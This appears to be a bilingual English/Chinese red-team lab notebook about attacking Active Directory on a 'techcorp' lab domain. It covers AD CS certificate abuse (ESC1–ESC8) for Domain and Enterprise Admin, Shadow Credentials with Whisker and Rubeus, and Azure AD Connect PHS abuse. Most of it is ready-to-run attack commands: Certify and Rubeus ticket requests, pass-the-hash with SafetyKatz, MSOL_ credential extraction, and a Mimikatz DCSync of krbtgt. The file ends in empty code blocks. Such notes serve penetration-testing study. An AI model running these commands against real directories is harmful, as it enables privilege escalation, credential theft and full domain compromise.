# AD CS

## 什么是域证书服务

• Active Directory Certificate Services (AD CS) enables use of Public Key Infrastructure (PKI) in active directory forest.（活动目录证书服务（AD CS）可以在活动目录森林中使用公钥基础设施（PKI）。）
• AD CS helps in authenticating users and machines, encrypting and signing documents, filesystem, emails and more.（AD CS有助于验证用户和机器，加密和签署文件、文件系统、电子邮件等。）
• "AD CS is the Server Role that allows you to build a public key infrastructure (PKI) and provide public key cryptography, digital certificates, and digital signature capabilities for your organization."（"AD CS是服务器角色，它允许你建立一个公钥基础设施（PKI），并为你的组织提供公钥密码学、数字证书和数字签名功能。"）


## 相关术语

• CA - The certification authority that issues certificates. The server with AD CS role (DC or separate) is the CA.（颁发证书的认证机构。具有AD CS角色的服务器（DC或独立）是CA。）
• Certificate - Issued to a user or machine and can be used for authentication,encryption, signing etc.（颁发给用户或机器，可用于认证、加密、签名等。）
• CSR - Certificate Signing Request made by a client to the CA to request a certificate.（客户端向CA申请证书的证书签名请求）
• Certificate Template - Defines settings for a certificate. Contains information like - enrolment permissions, EKUs, expiry etc.（定义证书的设置。包含的信息有：注册权限、EKU、过期等。）
• EKU OIDs - Extended Key Usages Object Identifiers. These dictate the use of a certificate template (Client authentication, Smart Card Logon, SubCA etc.)（扩展密钥使用对象标识符。这些决定了证书模板的使用（客户认证、智能卡登录、子CA等）。）


## 利用思路
• There are various ways of abusing ADCS! (See the link to "Certified Pre-Owned" paper in slide notes):
– Extract user and machine certificates（提取用户或者机器的证书）
– Use certificates to retrieve NTLM hash（利用证书恢复NTLM哈希）
– User and machine level persistence（用户和机器层级的权限维持）
– Escalation to Domain Admin and Enterprise Admin（权限提升到 Domain Admin和Enterprise Admin）
– Domain persistence(域权限维持)


## 方法

### Stealing Certificates

1. THEFT1 Export certs with private keys using Windows' crypto APIs
2. THEFT2 Extracting user certs with private keys using DPAPI
3. THEFT3 Extracting machine certs with private keys using DPAPI
4. THEFT4 Steal certificates from files and stores
5. THEFT5 Use Kerberos PKINIT to get NTLM hash


### Persistence

1. PERSIST1 User persistence by requesting new certs
2. PERSIST2 Machine persistence by requesting new certs
3. PERSIST3 User/Machine persistence by renewing certs

### Escalation 

1. ESC1 Enrolee can request cert for ANY user
2. ESC2 Any purpose or no EKU (potentially dangerous)
3. ESC3 Request an enrollment agent certificate and use it to request cert on behalf of ANY user
4. ESC4 Overly permissive ACLs on templates
5. ESC5 Poor access control on CA server, CA server computer object etc.
6. ESC6 EDITF_ATTRI BUTESUBJE CTALTNAME 2 setting on CA -Request certs for ANY user
7. ESC7 Poor access control on roles on CA authority like "CA Administrator" and "Certificate Manager"
8. ESC8 NTLM relay to HTTP enrollment endpoints

### Domain Persistence

1. DPERSIST1 Forge certificates with stolen CA private keys
2. DPERSIST2 Malicious root/interm ediate CAs
3. DPERSIST3 Backdoor CA Server,CA server computer object etc.



## 枚举

使用[Certify.exe](https://github.com/GhostPack/Certify)

枚举证书
```
Certify.exe cas
```
枚举模板
```
Certify.exe find
```
枚举可以利用的模板
```
Certify.exe find /vulnerable

Certify.exe find /enrolleeSuppliesSubject
```


• Common requirements/misconfigurations for all the Escalations（导致权限提升的要求或者错误配置）

– CA grants normal/low-privileged users enrollment rights(CA授予正常/低权限的用户注册权限)
– Manager approval is disabled（Manager approval被禁用）
– Authorization signatures are not required（不需要授权签名）
– The target template grants normal/low-privileged users enrollment rights（目标模板授予普通/低权限的用户注册权限）


使用模板请求tgt
```
C:\AD\Tools\Rubeus.exe asktgt /user:pawadmin /certificate:C:\AD\Tools\pawadmin.pfx /password:SecretPass@123 /nowrap /ptt
```

## 为DA申请证书
```
C:\AD\Tools\Certify.exe request /ca:Techcorp-DC.techcorp.local\TECHCORP-DC-CA /template:ForAdminsofPrivilegedAccessWorkstations /altname:Administrator
```

pfx转换成pem证书
```
C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\DA.pfx
```

请求DA tgt,并且注入到当前进程
```
C:\AD\Tools\Rubeus.exe asktgt /user:Administrator /certificate:C:\AD\Tools\DA.pfx /password:SecretPass@123 /nowrap /ptt
```

## 为EA申请证书

```
C:\AD\Tools\Certify.exe request /ca:Techcorp-DC.techcorp.local\TECHCORP-DC-CA /template:ForAdminsofPrivilegedAccessWorkstations /altname:Administrator
```
pfx转换成pem证书
```
C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\EA.pfx
```

请求EA tgt,并且注入到当前进程
```
C:\AD\Tools\Rubeus.exe asktgt /user:techcorp.local\Administrator /dc:techcorp-dc.techcorp.local /certificate:C:\AD\Tools\EA.pfx /password:SecretPass@123 /nowrap /ptt
```


# Shadow Credentials

## 是什么？

• Users and Computers have msDS-KeyCredentialLink attribute that contains the raw public keys of certificate that can be used as an alternate credential.（用户和计算机有msDS-KeyCredentialLink属性，该属性包含可用作替代凭证的证书的原始公钥。）
• This attribute is used when we configure Windows Hello for Business (WHfB)（这个属性在我们配置Windows Hello for Business（WHFB）时使用）
• By default, Key Admins and Enterprise Key Admins have rights to modify the msDS-KeyCredentialLink attribute.（默认情况下，密钥管理员和企业密钥管理员有权利修改msDS-KeyCredentialLink属性。）


## 利用条件
• User to User (U2U) Service Ticket can be requested to decrypt the encrypted NTLM_SUPPLEMENTAL_CREDENTIAL entity from Privilege Attribute Certificate (PAC) and extract NTLM hash.（可以请求用户对用户（U2U）服务票，从特权属性证书（PAC）中解密加密的NTLM_SUPPLEMENTAL_CREDENTIAL实体，并提取NTLM哈希。）

• Pre-requisites to abuse Shadow Credentials:
- AD CS (Key Trust if AD CS is not present)（AD CS（如果不存在AD CS，则需要密钥信任））
- Support for PKINIT and at least one DC with Windows Server 2016 or above.（支持PKINIT和至少一个Windows Server 2016或以上版本的DC）
- Permissions (GenericWrite/GenericAll) to modify the msDS-KeyCredentialLink attribute of the target object.（有权限（GenericWrite/GenericAll）来修改目标对象的msDS-KeyCredentialLink属性。）

## Abusing User Object（用户对象）

枚举权限
```
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "StudentUsers"}
```

添加 Shadow凭据
```
Whisker.exe add /target:supportXuser
```

Using PowerView, see if the Shadow Credential is added.
```
Get-DomainUser -Identity supportXuser
```

Request the TGT by leveraging the certificate.
```
Rubeus.exe asktgt /user:supportXuser /certificate:MIIJuAIBAzCCCXQGCSqGSIb3DQEHAaCCCW.... /password:"1OT0qAom3..." /domain:us.techcorp.local /dc:US-DC.us.techcorp.local /getcredentials /show /nowrap
```
Inject the TGT in the current session or use the NTLM hash
```
Rubeus.exe ptt /ticket:doIGgDCCBnygAwIBBaEDAgEW...
```

## Abusing Computer Object（机器对象）

枚举权限
```
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match 'mgmtadmin’}
```
添加 Shadow凭据
```
C:\AD\Tools\SafetyKatz.exe "sekurlsa::pth /user:mgmtadmin /domain:us.techcorp.local /aes256:32827622ac4357bcb476ed3ae362f9d3e7d27e292eb27519d2b8b419db24c00f /run:cmd.exe" "exit"
```

```
Whisker.exe add /target:us-helpdesk$
```

Using PowerView, see if the Shadow Credential is added.
```
Get-DomainComputer -Identity us-helpdesk
```

Request the TGT by leveraging the certificate.
```
Rubeus.exe asktgt /user:us-helpdesk$ /certificate:MIIJ0AIBAzCCCYwGCSqGSIb... /password:"ViGFoZJa..." /domain:us.techcorp.local /dc:US-DC.us.techcorp.local /getcredentials /show
```

Request and Inject the TGS by impersonating the user.
```
Rubeus.exe s4u /dc:us-dc.us.techcorp.local /ticket:doIGkDCCBoygAwIBBaEDAgEW... /impersonateuser:administrator /ptt /self /altservice:cifs/us-helpdesk
```

# Attacking Azure AD Integration

• An on-premises AD can be integrated with Azure AD using Azure AD Connect with the following methods:(使用Azure AD Connect，可以用以下方法将企业内部的AD与Azure AD集成。)

– Password Hash Sync (PHS)(密码哈希同步（PHS）)
– Pass-Through Authentication (PTA)(Pass-Through认证（PTA）)
– Federation(联盟？)

• Azure AD Connect is installed on-premises and has a high privilege account both in on AD and Azure AD!（Azure AD Connect安装在企业内部，在AD和Azure AD中都有一个高权限的账户!）


##  PHS

• It shares users and their password hashes from on-premises AD to Azure AD.（它将用户和他们的密码哈希值从企业内部的AD共享到Azure AD）
• A new users MSOL_ is created which has Synchronization rights (DCSync) on the domain!（一个新的用户MSOL_被创建，它在域上有同步的权利（DCSync）!）


枚举PHS账户和安装AD连接的服务器

使用PowerView
```
Get-DomainUser -Identity "MSOL_*" -Domain techcorp.local
```
使用ActiveDirectory module
```
Get-ADUser -Filter "samAccountName -like 'MSOL_*'" -Server techcorp.local -Properties * | select SamAccountName,Description | fl
```

- 我们已经以helpdeskadmin的身份对我们的adconnect有管理权限。
- 有了管理权限，如果我们运行adconnect.ps1，我们可以提取AD Connect使用的MSOL_账户的明文凭证
```
.\adconnect.ps1
```

With the password, we can run commands as MSOL_
```
runas /user:techcorp.local\MSOL_16fb75d0227d /netonly cmd
```

can execute the DCSync attack
```
Invoke-Mimikatz -Command '"lsadump::dcsync /user:us\krbtgt"'

Invoke-Mimikatz -Command '"lsadump::dcsync /user:techcorp\krbtgt /domain:techcorp.local"'
```

```

```

```

```

```

```

```

```

```

```

